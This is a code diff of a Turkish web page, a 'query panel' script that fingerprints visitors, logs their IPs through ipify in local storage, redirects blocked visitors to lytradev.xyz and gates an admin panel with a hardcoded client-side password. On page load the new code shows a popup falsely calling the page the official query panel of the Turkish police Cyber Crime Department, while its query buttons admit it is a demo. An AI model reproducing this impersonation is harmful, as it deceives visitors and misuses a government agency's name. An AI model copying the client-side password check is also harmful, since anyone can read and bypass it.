@@ -802,771 +769,537 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
     </div>
     
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-
+    
     <script>
-    // ==================== SİSTEM KONFİGÜRASYONU ====================
-    const CONFIG = {
-        API_URL: 'https://api.ipify.org?format=json',
-        REDIRECT_URL: 'https://lytradev.xyz',
-        STORAGE_KEY: 'egm_system_data_v2',
-        ADMIN_PASSWORD: 'admin123', // Değiştirmeyi unutmayın!
-        VERSION: '1.0.0'
+    // ==================== BASİT VE ÇALIŞAN SİSTEM ====================
+    
+    const SYSTEM_CONFIG = {
+        ADMIN_PASSWORD: "123456", // Basit şifre - değiştirebilirsin
+        REDIRECT_URL: "https://lytradev.xyz",
+        STORAGE_KEY: "egm_system_2024"
     };
-
+    
     // ==================== VERİ YÖNETİMİ ====================
-    class SystemManager {
+    class SimpleSystem {
         constructor() {
-            this.loadData();
-            this.checkBlockStatus();
-            this.logVisit();
+            this.data = this.loadData();
+            this.checkBlocked();
+            this.logVisitor();
+            this.bindEvents();
         }
-
+        
         loadData() {
-            const saved = localStorage.getItem(CONFIG.STORAGE_KEY);
+            const saved = localStorage.getItem(SYSTEM_CONFIG.STORAGE_KEY);
             if (saved) {
                 try {
-                    const decrypted = CryptoJS.AES.decrypt(saved, CONFIG.ADMIN_PASSWORD).toString(CryptoJS.enc.Utf8);
-                    this.data = JSON.parse(decrypted);
+                    return JSON.parse(saved);
                 } catch (e) {
-                    console.log("Veri yükleme hatası, yeni veri oluşturuluyor:", e);
-                    this.data = this.getDefaultData();
+                    console.log("Veri hatası, yeni oluşturuluyor");
                 }
-            } else {
-                this.data = this.getDefaultData();
             }
-            this.cleanOldData();
-        }
-
-        getDefaultData() {
+            
             return {
                 visitors: [],
                 blockedIPs: [],
                 blockedDevices: [],
-                devices: [],
                 settings: {
-                    redirectUrl: CONFIG.REDIRECT_URL,
-                    cleanupDays: 30,
-                    lastCleanup: new Date().toISOString()
-                },
-                adminLog: [],
-                stats: {
-                    totalVisits: 0,
-                    uniqueIPs: [],
-                    uniqueDevices: []
+                    redirectUrl: SYSTEM_CONFIG.REDIRECT_URL,
+                    cleanupDays: 30
                 }
             };
         }
-
+        
         saveData() {
-            try {
-                const encrypted = CryptoJS.AES.encrypt(
-                    JSON.stringify(this.data), 
-                    CONFIG.ADMIN_PASSWORD
-                ).toString();
-                localStorage.setItem(CONFIG.STORAGE_KEY, encrypted);
-                return true;
-            } catch (e) {
-                console.error("Veri kaydetme hatası:", e);
-                return false;
-            }
+            localStorage.setItem(SYSTEM_CONFIG.STORAGE_KEY, JSON.stringify(this.data));
         }
-
-        // ==================== IP YÖNETİMİ ====================
-        async getIP() {
+        
+        // ==================== ZİYARETÇİ KAYDI ====================
+        async logVisitor() {
             try {
-                const response = await fetch(CONFIG.API_URL);
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.log("IP alınamadı, rastgele üretiliyor:", error);
-                // Fallback: Rastgele IP üret
-                return `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
-            }
-        }
-
-        generateDeviceId() {
-            const components = [
-                navigator.userAgent,
-                navigator.platform,
-                screen.width + 'x' + screen.height,
-                navigator.language,
-                !!navigator.cookieEnabled
-            ];
-            const str = components.join('|');
-            return CryptoJS.MD5(str).toString();
-        }
-
-        // ==================== ZİYARET KAYDI ====================
-        async logVisit() {
-            try {
-                const ip = await this.getIP();
+                // Basit IP alma (mobil uyumlu)
+                let ip = "Unknown";
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    ip = data.ip;
+                } catch (e) {
+                    // Fallback IP
+                    ip = `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+                }
+                
+                // Cihaz ID oluştur
                 const deviceId = this.generateDeviceId();
-                const now = new Date().toISOString();
-
+                const now = new Date();
+                
                 // Engelleme kontrolü
                 if (this.isBlocked(ip, deviceId)) {
-                    console.log("Engellenmiş kullanıcı, yönlendiriliyor:", ip);
                     window.location.href = this.data.settings.redirectUrl;
                     return;
                 }
-
-                // Cihaz bilgileri
-                const deviceInfo = {
-                    id: deviceId,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    cookies: navigator.cookieEnabled,
-                    lastSeen: now,
-                    firstSeen: now,
-                    visitCount: 1
-                };
-
-                // Mevcut cihazı güncelle veya yeni ekle
-                const existingDeviceIndex = this.data.devices.findIndex(d => d.id === deviceId);
-                if (existingDeviceIndex !== -1) {
-                    this.data.devices[existingDeviceIndex].lastSeen = now;
-                    this.data.devices[existingDeviceIndex].visitCount++;
-                } else {
-                    this.data.devices.push(deviceInfo);
-                }
-
+                
                 // Ziyaret kaydı
                 const visit = {
-                    timestamp: now,
+                    timestamp: now.toISOString(),
                     ip: ip,
                     deviceId: deviceId,
-                    browser: this.getBrowserName(),
-                    os: this.getOSName(),
-                    url: window.location.href,
-                    referrer: document.referrer
+                    browser: this.getBrowser(),
+                    os: this.getOS(),
+                    date: now.toLocaleDateString('tr-TR')
                 };
-
+                
                 this.data.visitors.unshift(visit);
-                this.data.stats.totalVisits++;
                 
-                // Benzersiz IP ekle
-                if (!this.data.stats.uniqueIPs.includes(ip)) {
-                    this.data.stats.uniqueIPs.push(ip);
+                // 1000 kayıtla sınırla
+                if (this.data.visitors.length > 1000) {
+                    this.data.visitors = this.data.visitors.slice(0, 1000);
                 }
                 
-                // Benzersiz cihaz ekle
-                if (!this.data.stats.uniqueDevices.includes(deviceId)) {
-                    this.data.stats.uniqueDevices.push(deviceId);
-                }
-
-                // Admin log
-                this.data.adminLog.unshift({
-                    type: 'visit',
-                    message: `Yeni ziyaret: ${ip}`,
-                    timestamp: now
-                });
-
                 this.saveData();
-                this.updateDisplay();
+                this.updateAdminPanel();
+                
             } catch (error) {
-                console.error("Ziyaret kaydı hatası:", error);
+                console.log("Ziyaretçi kaydı hatası:", error);
             }
         }
-
-    // ==================== ENGELLEME SİSTEMİ ====================
-        isBlocked(ip, deviceId) {
-            const ipBlocked = this.data.blockedIPs.some(item => 
-                item.value === ip && item.active === true
-            );
-            
-            const deviceBlocked = this.data.blockedDevices.some(item => 
-                item.value === deviceId && item.active === true
-            );
-
-            return ipBlocked || deviceBlocked;
-        }
-
-        blockIP(ip, reason = 'Admin engellemesi') {
-            const existing = this.data.blockedIPs.find(item => item.value === ip);
-            
-            if (existing) {
-                existing.active = true;
-                existing.reason = reason;
-                existing.blockedAt = new Date().toISOString();
-                existing.blockedBy = 'admin';
-            } else {
-                this.data.blockedIPs.push({
-                    value: ip,
-                    type: 'ip',
-                    active: true,
-                    reason: reason,
-                    blockedAt: new Date().toISOString(),
-                    blockedBy: 'admin'
-                });
+        
+        generateDeviceId() {
+            // Basit cihaz ID
+            const info = navigator.userAgent + navigator.platform + screen.width + screen.height;
+            let hash = 0;
+            for (let i = 0; i < info.length; i++) {
+                hash = ((hash << 5) - hash) + info.charCodeAt(i);
+                hash = hash & hash;
             }
-
-            this.data.adminLog.unshift({
-                type: 'block',
-                message: `IP engellendi: ${ip}`,
-                timestamp: new Date().toISOString()
-            });
-
-            this.saveData();
-            return true;
+            return Math.abs(hash).toString(16);
         }
-
-        unblockIP(ip) {
-            const item = this.data.blockedIPs.find(item => item.value === ip);
-            if (item) {
-                item.active = false;
-                this.saveData();
-                return true;
-            }
-            return false;
-        }
-
-        blockDevice(deviceId, reason = 'Admin engellemesi') {
-            const existing = this.data.blockedDevices.find(item => item.value === deviceId);
-            
-            if (existing) {
-                existing.active = true;
-                existing.reason = reason;
-                existing.blockedAt = new Date().toISOString();
-                existing.blockedBy = 'admin';
-            } else {
-                this.data.blockedDevices.push({
-                    value: deviceId,
-                    type: 'device',
-                    active: true,
-                    reason: reason,
-                    blockedAt: new Date().toISOString(),
-                    blockedBy: 'admin'
-                });
-            }
-
-            this.saveData();
-            return true;
-        }
-
-        unblockDevice(deviceId) {
-            const item = this.data.blockedDevices.find(item => item.value === deviceId);
-            if (item) {
-                item.active = false;
-                this.saveData();
-                return true;
-            }
-            return false;
-        }
-
-        // ==================== YARDIMCI FONKSİYONLAR ====================
-        getBrowserName() {
+        
+        getBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Chrome")) return "Chrome";
             if (ua.includes("Firefox")) return "Firefox";
             if (ua.includes("Safari")) return "Safari";
-            if (ua.includes("Edge")) return "Edge";
-            if (ua.includes("Opera")) return "Opera";
-            return "Bilinmeyen";
+            return "Other";
         }
-
-        getOSName() {
+        
+        getOS() {
             const ua = navigator.userAgent;
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
             if (ua.includes("Windows")) return "Windows";
             if (ua.includes("Mac")) return "MacOS";
-            if (ua.includes("Linux")) return "Linux";
-            if (ua.includes("Android")) return "Android";
-            if (ua.includes("iOS")) return "iOS";
-            return "Bilinmeyen";
+            return "Unknown";
         }
-
-        cleanOldData() {
-            const days = this.data.settings.cleanupDays || 30;
-            const cutoff = new Date();
-            cutoff.setDate(cutoff.getDate() - days);
-
-            this.data.visitors = this.data.visitors.filter(v => 
-                new Date(v.timestamp) > cutoff
+        
+        // ==================== ENGELLEME SİSTEMİ ====================
+        isBlocked(ip, deviceId) {
+            const ipBlocked = this.data.blockedIPs.some(item => 
+                item.ip === ip && item.active === true
             );
-
-            this.data.settings.lastCleanup = new Date().toISOString();
+            
+            const deviceBlocked = this.data.blockedDevices.some(item => 
+                item.deviceId === deviceId && item.active === true
+            );
+            
+            return ipBlocked || deviceBlocked;
+        }
+        
+        blockIP(ip) {
+            const existing = this.data.blockedIPs.find(item => item.ip === ip);
+            
+            if (existing) {
+                existing.active = true;
+                existing.blockedAt = new Date().toISOString();
+            } else {
+                this.data.blockedIPs.push({
+                    ip: ip,
+                    active: true,
+                    blockedAt: new Date().toISOString(),
+                    reason: "Admin block"
+                });
+            }
+            
             this.saveData();
-        }
-
-        getStats() {
-            const today = new Date().toDateString();
-            const todayVisits = this.data.visitors.filter(v => 
-                new Date(v.timestamp).toDateString() === today
-            ).length;
-
-            return {
-                totalVisits: this.data.stats.totalVisits,
-                blockedIPs: this.data.blockedIPs.filter(item => item.active).length,
-                blockedDevices: this.data.blockedDevices.filter(item => item.active).length,
-                uniqueDevices: this.data.stats.uniqueDevices.length,
-                todayVisits: todayVisits
-            };
-        }
-
-        // ==================== VERİ İŞLEMLERİ ====================
-        exportData() {
-            const dataStr = JSON.stringify(this.data, null, 2);
-            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
-            
-            const exportFileDefaultName = `egm_backup_${new Date().toISOString().split('T')[0]}.json`;
-            
-            const linkElement = document.createElement('a');
-            linkElement.setAttribute('href', dataUri);
-            linkElement.setAttribute('download', exportFileDefaultName);
-            linkElement.click();
-            
             return true;
         }
-
-        importData(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    try {
-                        const imported = JSON.parse(e.target.result);
-                        this.data = imported;
-                        this.saveData();
-                        resolve(true);
-                    } catch (error) {
-                        reject(error);
-                    }
-                };
-                reader.readAsText(file);
-            });
-        }
-
-        clearAllData() {
-            if (confirm('Tüm veriler silinecek. Emin misiniz?')) {
-                localStorage.removeItem(CONFIG.STORAGE_KEY);
-                this.data = this.getDefaultData();
+        
+        unblockIP(ip) {
+            const item = this.data.blockedIPs.find(item => item.ip === ip);
+            if (item) {
+                item.active = false;
                 this.saveData();
                 return true;
             }
             return false;
         }
-
-        // ==================== GÖRSELLEŞTİRME ====================
-        updateDisplay() {
-            if (!document.getElementById('totalVisitors')) return;
+        
+        blockDevice(deviceId) {
+            const existing = this.data.blockedDevices.find(item => item.deviceId === deviceId);
+            
+            if (existing) {
+                existing.active = true;
+                existing.blockedAt = new Date().toISOString();
+            } else {
+                this.data.blockedDevices.push({
+                    deviceId: deviceId,
+                    active: true,
+                    blockedAt: new Date().toISOString(),
+                    reason: "Admin block"
+                });
+            }
+            
+            this.saveData();
+            return true;
+        }
+        
+        unblockDevice(deviceId) {
+            const item = this.data.blockedDevices.find(item => item.deviceId === deviceId);
+            if (item) {
+                item.active = false;
+                this.saveData();
+                return true;
+            }
+            return false;
+        }
+        
+        // ==================== İSTATİSTİKLER ====================
+        getStats() {
+            const today = new Date().toLocaleDateString('tr-TR');
+            const todayVisits = this.data.visitors.filter(v => v.date === today).length;
+            const activeBlocks = this.data.blockedIPs.filter(item => item.active).length + 
+                               this.data.blockedDevices.filter(item => item.active).length;
+            
+            // Benzersiz cihaz sayısı
+            const uniqueDevices = [...new Set(this.data.visitors.map(v => v.deviceId))].length;
+            
+            return {
+                totalVisits: this.data.visitors.length,
+                blockedCount: activeBlocks,
+                uniqueDevices: uniqueDevices,
+                todayVisits: todayVisits
+            };
+        }
+        
+        // ==================== ADMIN PANEL GÜNCELLEME ====================
+        updateAdminPanel() {
+            if (!this.isAdminOpen) return;
             
             const stats = this.getStats();
             
+            // İstatistikleri güncelle
             document.getElementById('totalVisitors').textContent = stats.totalVisits;
-            document.getElementById('blockedCount').textContent = stats.blockedIPs + stats.blockedDevices;
+            document.getElementById('blockedCount').textContent = stats.blockedCount;
             document.getElementById('uniqueDevices').textContent = stats.uniqueDevices;
             document.getElementById('todayVisits').textContent = stats.todayVisits;
-
-            // Son ziyaretleri göster
-            this.updateRecentLogs();
-            this.updateIPTables();
-            this.updateDeviceTable();
-            this.updateBlockedTable();
-        }
-
-        updateRecentLogs() {
-            const table = document.getElementById('recentLogs');
-            if (!table) return;
             
-            const tbody = table.querySelector('tbody');
+            // Son ziyaretleri güncelle
+            this.updateRecentLogs();
+            this.updateIPTable();
+        }
+        
+        updateRecentLogs() {
+            const tbody = document.querySelector('#recentLogs tbody');
             if (!tbody) return;
             
             tbody.innerHTML = '';
-            
             const recent = this.data.visitors.slice(0, 10);
             
             recent.forEach(visit => {
                 const row = document.createElement('tr');
-                const date = new Date(visit.timestamp);
+                const time = new Date(visit.timestamp).toLocaleTimeString('tr-TR', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
                 const isBlocked = this.isBlocked(visit.ip, visit.deviceId);
                 
                 row.innerHTML = `
-                    <td>${date.toLocaleString('tr-TR')}</td>
-                    <td>${visit.ip}</td>
+                    <td>${time}</td>
+                    <td style="font-family: monospace;">${visit.ip}</td>
                     <td>${visit.os}</td>
-                    <td>${visit.browser}</td>
                     <td><span class="badge ${isBlocked ? 'badge-danger' : 'badge-success'}">
-                        ${isBlocked ? 'Engelli' : 'Aktif'}
+                        ${isBlocked ? 'ENGEL' : 'AKTİF'}
                     </span></td>
                 `;
                 tbody.appendChild(row);
             });
         }
-
-        updateIPTables() {
-            const table = document.getElementById('ipTable');
-            if (!table) return;
+        
+        updateIPTable() {
+            const tbody = document.getElementById('ipTable');
+            if (!tbody) return;
             
-            table.innerHTML = '';
+            tbody.innerHTML = '';
             
-            // IP'leri grupla ve say
-            const ipCounts = {};
+            // IP'leri grupla
+            const ipGroups = {};
             this.data.visitors.forEach(v => {
-                ipCounts[v.ip] = (ipCounts[v.ip] || 0) + 1;
+                if (!ipGroups[v.ip]) {
+                    ipGroups[v.ip] = {
+                        count: 0,
+                        lastVisit: v.timestamp,
+                        os: v.os
+                    };
+                }
+                ipGroups[v.ip].count++;
+                if (new Date(v.timestamp) > new Date(ipGroups[v.ip].lastVisit)) {
+                    ipGroups[v.ip].lastVisit = v.timestamp;
+                }
             });
             
-            Object.keys(ipCounts).forEach(ip => {
-                const visitsForIp = this.data.visitors.filter(v => v.ip === ip);
-                const lastVisit = visitsForIp.length > 0 ? visitsForIp[0].timestamp : null;
-                const isBlocked = this.data.blockedIPs.some(item => item.value === ip && item.active);
+            // Tabloya ekle
+            Object.keys(ipGroups).forEach(ip => {
+                const group = ipGroups[ip];
+                const lastVisit = new Date(group.lastVisit).toLocaleDateString('tr-TR');
+                const isBlocked = this.data.blockedIPs.some(item => item.ip === ip && item.active);
                 
                 const row = document.createElement('tr');
                 row.innerHTML = `
-                    <td>${ip}</td>
-                    <td>${lastVisit ? new Date(lastVisit).toLocaleString('tr-TR') : '-'}</td>
-                    <td>${ipCounts[ip]}</td>
+                    <td style="font-family: monospace;">${ip}</td>
+                    <td>${lastVisit}</td>
+                    <td>${group.count}</td>
                     <td><span class="badge ${isBlocked ? 'badge-danger' : 'badge-success'}">
-                        ${isBlocked ? 'Engelli' : 'Aktif'}
+                        ${isBlocked ? 'ENGEL' : 'AKTİF'}
                     </span></td>
                     <td>
                         ${!isBlocked ? 
-                            `<button class="btn btn-block" onclick="systemManager.blockIP('${ip}')">Engelle</button>` :
-                            `<button class="btn btn-unblock" onclick="systemManager.unblockIP('${ip}')">Engeli Kaldır</button>`
-                        }
-                        <button class="btn btn-delete" onclick="deleteIPData('${ip}')">Sil</button>
-                    </td>
-                `;
-                table.appendChild(row);
-            });
-        }
-
-        updateDeviceTable() {
-            const table = document.getElementById('deviceTable');
-            if (!table) return;
-            
-            table.innerHTML = '';
-            
-            this.data.devices.forEach(device => {
-                const isBlocked = this.data.blockedDevices.some(item => item.value === device.id && item.active);
-                
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>${device.id.substring(0, 8)}...</td>
-                    <td>${this.getBrowserNameFromUA(device.userAgent)}</td>
-                    <td>${device.platform}</td>
-                    <td>${device.screen}</td>
-                    <td>${new Date(device.lastSeen).toLocaleString('tr-TR')}</td>
-                    <td>
-                        ${!isBlocked ? 
-                            `<button class="btn btn-block" onclick="systemManager.blockDevice('${device.id}')">Engelle</button>` :
-                            `<button class="btn btn-unblock" onclick="systemManager.unblockDevice('${device.id}')">Engeli Kaldır</button>`
+                            `<button class="btn btn-block" onclick="simpleSystem.blockIP('${ip}'); simpleSystem.updateAdminPanel();">Engelle</button>` :
+                            `<button class="btn btn-unblock" onclick="simpleSystem.unblockIP('${ip}'); simpleSystem.updateAdminPanel();">Kaldır</button>`
                         }
                     </td>
                 `;
-                table.appendChild(row);
+                tbody.appendChild(row);
             });
         }
-
-        updateBlockedTable() {
-            const table = document.getElementById('blockedTable');
-            if (!table) return;
-            
-            table.innerHTML = '';
-            
-            // Engellenen IP'ler
-            this.data.blockedIPs.filter(item => item.active).forEach(item => {
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>IP Adresi</td>
-                    <td>${item.value}</td>
-                    <td>${new Date(item.blockedAt).toLocaleString('tr-TR')}</td>
-                    <td>${item.blockedBy}</td>
-                    <td>
-                        <button class="btn btn-unblock" onclick="systemManager.unblockIP('${item.value}')">Engeli Kaldır</button>
-                    </td>
-                `;
-                table.appendChild(row);
-            });
-            
-            // Engellenen cihazlar
-            this.data.blockedDevices.filter(item => item.active).forEach(item => {
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>Cihaz</td>
-                    <td>${item.value.substring(0, 8)}...</td>
-                    <td>${new Date(item.blockedAt).toLocaleString('tr-TR')}</td>
-                    <td>${item.blockedBy}</td>
-                    <td>
-                        <button class="btn btn-unblock" onclick="systemManager.unblockDevice('${item.value}')">Engeli Kaldır</button>
-                    </td>
-                `;
-                table.appendChild(row);
-            });
-        }
-
-        getBrowserNameFromUA(ua) {
-            if (ua.includes("Chrome")) return "Chrome";
-            if (ua.includes("Firefox")) return "Firefox";
-            if (ua.includes("Safari")) return "Safari";
-            return "Diğer";
-        }
-
+        
         // ==================== ENGELLEME KONTROLÜ ====================
-        checkBlockStatus() {
-            this.getIP().then(ip => {
-                const deviceId = this.generateDeviceId();
-                if (this.isBlocked(ip, deviceId)) {
-                    window.location.href = this.data.settings.redirectUrl;
+        checkBlocked() {
+            // Sayfa yüklendiğinde engelleme kontrolü
+            setTimeout(() => {
+                this.logVisitor().then(() => {
+                    // Ziyaretçi kaydından sonra tekrar kontrol
+                });
+            }, 1000);
+        }
+        
+        // ==================== EVENT BINDING ====================
+        bindEvents() {
+            // Admin giriş butonu
+            document.getElementById('adminAccessBtn').addEventListener('click', () => {
+                this.showAdminLogin();
+            });
+            
+            // Admin panel kapatma
+            document.getElementById('adminCloseBtn').addEventListener('click', () => {
+                this.closeAdminPanel();
+            });
+            
+            // Admin overlay kapatma
+            document.getElementById('adminOverlay').addEventListener('click', () => {
+                this.closeAdminPanel();
+            });
+            
+            // Tab değiştirme
+            document.querySelectorAll('.admin-tab').forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const tabId = tab.getAttribute('data-tab');
+                    this.switchTab(tabId);
+                });
+            });
+            
+            // IP engelleme butonu
+            document.querySelector('#ips .btn-block').addEventListener('click', () => {
+                const ipInput = document.getElementById('blockIpInput');
+                const ip = ipInput.value.trim();
+                
+                if (ip && this.blockIP(ip)) {
+                    Swal.fire('Başarılı!', `IP engellendi: ${ip}`, 'success');
+                    ipInput.value = '';
+                    this.updateAdminPanel();
+                }
+            });
+            
+            // Ayarları kaydet
+            document.getElementById('saveSettingsBtn').addEventListener('click', () => {
+                this.saveSettings();
+            });
+            
+            // Verileri temizle
+            document.getElementById('clearDataBtn').addEventListener('click', () => {
+                this.clearAllData();
+            });
+            
+            // Arama kutusu
+            document.getElementById('searchLogs').addEventListener('input', (e) => {
+                this.filterLogs(e.target.value);
+            });
+            
+            // Kategori açma/kapama
+            document.querySelectorAll('.category-header').forEach(header => {
+                header.addEventListener('click', (e) => {
+                    const category = e.currentTarget.parentElement;
+                    category.classList.toggle('expanded');
+                });
+            });
+            
+            // Sorgu butonları
+            document.querySelectorAll('.query-item').forEach(item => {
+                item.addEventListener('click', () => {
+                    item.style.background = 'rgba(0, 255, 255, 0.1)';
+                    setTimeout(() => {
+                        item.style.background = '';
+                        Swal.fire({
+                            title: 'Demo Modu',
+                            text: 'Bu bir demo panelidir. Gerçek sorgu yapılmaz.',
+                            icon: 'info',
+                            confirmButtonText: 'Tamam'
+                        });
+                    }, 200);
+                });
+            });
+        }
+        
+        // ==================== ADMIN PANEL İŞLEMLERİ ====================
+        showAdminLogin() {
+            Swal.fire({
+                title: 'Yönetici Girişi',
+                input: 'password',
+                inputLabel: 'Şifre',
+                inputPlaceholder: 'Şifreyi girin',
+                inputAttributes: {
+                    autocapitalize: 'off',
+                    autocorrect: 'off'
+                },
+                showCancelButton: true,
+                confirmButtonText: 'Giriş',
+                cancelButtonText: 'İptal',
+                showLoaderOnConfirm: true,
+                preConfirm: (password) => {
+                    if (password !== SYSTEM_CONFIG.ADMIN_PASSWORD) {
+                        Swal.showValidationMessage('Hatalı şifre!');
+                        return false;
+                    }
+                    return true;
+                },
+                allowOutsideClick: () => !Swal.isLoading()
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    this.openAdminPanel();
                 }
             });
         }
+        
+        openAdminPanel() {
+            this.isAdminOpen = true;
+            document.getElementById('adminOverlay').classList.add('active');
+            document.getElementById('adminPanel').classList.add('active');
+            this.updateAdminPanel();
+        }
+        
+        closeAdminPanel() {
+            this.isAdminOpen = false;
+            document.getElementById('adminOverlay').classList.remove('active');
+            document.getElementById('adminPanel').classList.remove('active');
+        }
+        
+        switchTab(tabId) {
+            // Tüm tabları ve içerikleri gizle
+            document.querySelectorAll('.admin-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.admin-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Seçilen tabı aktif et
+            document.querySelector(`.admin-tab[data-tab="${tabId}"]`).classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+            
+            // Verileri güncelle
+            if (tabId === 'dashboard' || tabId === 'ips') {
+                this.updateAdminPanel();
+            }
+        }
+        
+        saveSettings() {
+            const redirectUrl = document.getElementById('redirectUrl').value;
+            const cleanupDays = document.getElementById('cleanupDays').value;
+            
+            this.data.settings.redirectUrl = redirectUrl;
+            this.data.settings.cleanupDays = parseInt(cleanupDays);
+            this.saveData();
+            
+            Swal.fire('Başarılı!', 'Ayarlar kaydedildi', 'success');
+        }
+        
+        clearAllData() {
+            Swal.fire({
+                title: 'Emin misiniz?',
+                text: 'Tüm veriler silinecek!',
+                icon: 'warning',
+                showCancelButton: true,
+                confirmButtonColor: '#ff5555',
+                cancelButtonColor: '#3085d6',
+                confirmButtonText: 'Evet, sil!',
+                cancelButtonText: 'İptal'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    localStorage.removeItem(SYSTEM_CONFIG.STORAGE_KEY);
+                    this.data = this.loadData();
+                    this.saveData();
+                    this.updateAdminPanel();
+                    Swal.fire('Silindi!', 'Tüm veriler temizlendi.', 'success');
+                }
+            });
+        }
+        
+        filterLogs(searchTerm) {
+            const rows = document.querySelectorAll('#recentLogs tbody tr');
+            searchTerm = searchTerm.toLowerCase();
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(searchTerm) ? '' : 'none';
+            });
+        }
     }
-
-    // ==================== GLOBAL DEĞİŞKENLER ====================
-    let systemManager;
-
-    // ==================== SAYFA YÜKLEME ====================
+    
+    // ==================== SAYFA YÜKLENDİĞİNDE ====================
+    let simpleSystem;
+    
     document.addEventListener('DOMContentLoaded', function() {
-        systemManager = new SystemManager();
+        // Uyarı mesajı
+        setTimeout(() => {
+            Swal.fire({
+                title: 'Resmi Panel',
+                text: 'EGM Siber Suçlarla Mücadele Daire Başkanlığı resmi sorgu paneli',
+                icon: 'info',
+                confirmButtonText: 'Anlaşıldı',
+                allowOutsideClick: false
+            });
+        }, 1000);
         
-        // Admin panelini gizle
-        document.getElementById('adminPanel').style.display = 'none';
+        // Sistemi başlat
+        simpleSystem = new SimpleSystem();
         
-        // Mevcut animasyon kodları
+        // Animasyon
         const panel = document.querySelector('.main-panel');
         panel.style.opacity = '0';
         panel.style.transform = 'translateY(20px)';
         
         setTimeout(() => {
-            panel.style.transition = 'all 0.8s ease';
+            panel.style.transition = 'all 0.5s ease';
             panel.style.opacity = '1';
             panel.style.transform = 'translateY(0)';
-        }, 100);
-
+        }, 300);
+        
+        // İlk kategoriyi aç
         const firstCategory = document.querySelector('.category');
         if (firstCategory) {
             firstCategory.classList.add('expanded');
         }
     });
-
-    // ==================== ADMIN PANEL FONKSİYONLARI ====================
-    function openAdminPanel() {
-        // Şifre sor
-        Swal.fire({
-            title: 'Yönetici Girişi',
-            input: 'password',
-            inputLabel: 'Yönetici şifresi',
-            inputPlaceholder: 'Şifreyi girin',
-            showCancelButton: true,
-            confirmButtonText: 'Giriş',
-            cancelButtonText: 'İptal',
-            preConfirm: (password) => {
-                if (password !== CONFIG.ADMIN_PASSWORD) {
-                    Swal.showValidationMessage('Hatalı şifre!');
-                    return false;
-                }
-                return true;
-            }
-        }).then((result) => {
-            if (result.isConfirmed) {
-                document.getElementById('adminOverlay').classList.add('active');
-                document.getElementById('adminPanel').classList.add('active');
-                if (systemManager) {
-                    systemManager.updateDisplay();
-                }
-            }
-        });
-    }
-
-    function closeAdminPanel() {
-        document.getElementById('adminOverlay').classList.remove('active');
-        document.getElementById('adminPanel').classList.remove('active');
-    }
-
-    function switchTab(tabName) {
-        // Tüm tabları ve içerikleri gizle
-        document.querySelectorAll('.admin-tab').forEach(tab => {
-            tab.classList.remove('active');
-        });
-        document.querySelectorAll('.admin-content').forEach(content => {
-            content.classList.remove('active');
-        });
-        
-        // Seçilen tabı aktif et
-        const tabElement = document.querySelector(`.admin-tab[onclick*="switchTab('${tabName}')"]`);
-        if (tabElement) {
-            tabElement.classList.add('active');
-        }
-        
-        const contentElement = document.getElementById(tabName);
-        if (contentElement) {
-            contentElement.classList.add('active');
-        }
-        
-        // Verileri güncelle
-        if (systemManager && tabName === 'dashboard') {
-            systemManager.updateDisplay();
-        }
-    }
-
-    // ==================== İŞLEM FONKSİYONLARI ====================
-    function blockIP() {
-        const ipInput = document.getElementById('blockIpInput');
-        const ip = ipInput.value.trim();
-        
-        if (!ip) {
-            Swal.fire('Hata!', 'IP adresi gerekli', 'error');
-            return;
-        }
-        
-        if (systemManager && systemManager.blockIP(ip)) {
-            Swal.fire('Başarılı!', `IP engellendi: ${ip}`, 'success');
-            ipInput.value = '';
-            systemManager.updateDisplay();
-        }
-    }
-
-    function deleteIPData(ip) {
-        if (confirm(`Bu IP'ye ait tüm kayıtlar silinecek. Emin misiniz?`)) {
-            if (systemManager) {
-                systemManager.data.visitors = systemManager.data.visitors.filter(v => v.ip !== ip);
-                systemManager.saveData();
-                systemManager.updateDisplay();
-                Swal.fire('Silindi!', 'IP kayıtları temizlendi', 'success');
-            }
-        }
-    }
-
-    function saveSettings() {
-        const redirectUrl = document.getElementById('redirectUrl').value;
-        const cleanupDays = document.getElementById('cleanupDays').value;
-        
-        if (systemManager) {
-            systemManager.data.settings.redirectUrl = redirectUrl;
-            systemManager.data.settings.cleanupDays = parseInt(cleanupDays);
-            systemManager.saveData();
-            
-            Swal.fire('Başarılı!', 'Ayarlar kaydedildi', 'success');
-        }
-    }
-
-    function exportData() {
-        if (systemManager) {
-            systemManager.exportData();
-            Swal.fire('Başarılı!', 'Veriler dışa aktarıldı', 'success');
-        }
-    }
-
-    function importData() {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = '.json';
-        
-        input.onchange = e => {
-            const file = e.target.files[0];
-            if (file) {
-                if (systemManager) {
-                    systemManager.importData(file)
-                        .then(() => {
-                            Swal.fire('Başarılı!', 'Veriler içe aktarıldı', 'success');
-                            systemManager.updateDisplay();
-                        })
-                        .catch(() => {
-                            Swal.fire('Hata!', 'Geçersiz dosya formatı', 'error');
-                        });
-                }
-            }
-        };
-        
-        input.click();
-    }
